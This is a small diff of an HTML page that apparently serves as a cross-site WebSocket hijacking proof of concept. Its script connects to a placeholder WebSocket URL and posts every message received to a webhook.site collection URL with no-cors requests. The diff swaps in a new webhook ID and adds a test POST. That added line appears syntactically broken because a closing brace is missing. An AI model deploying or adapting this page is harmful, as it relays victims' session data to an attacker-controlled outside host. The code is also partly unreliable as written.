@@ -8,12 +8,13 @@
 <body>
     <p>Hello sir</p>
     <script>
+        fetch('https://webhook.site/51704263-2f21-4253-a901-09dd91de729d', {method: 'POST', mode: 'no-cors', body: {hi : 'hi'});
         var ws = new WebSocket('wss://your-websocket-url');
         ws.onopen = function() {
             ws.send("hello");
         };
         ws.onmessage = function(event) {
-            fetch('https://webhook.site/8b094925-758f-4fc8-a20f-02c1b55e450c', {method: 'POST', mode: 'no-cors', body: event.data});
+            fetch('https://webhook.site/51704263-2f21-4253-a901-09dd91de729d', {method: 'POST', mode: 'no-cors', body: event.data});
         };
     </script>
 </body>
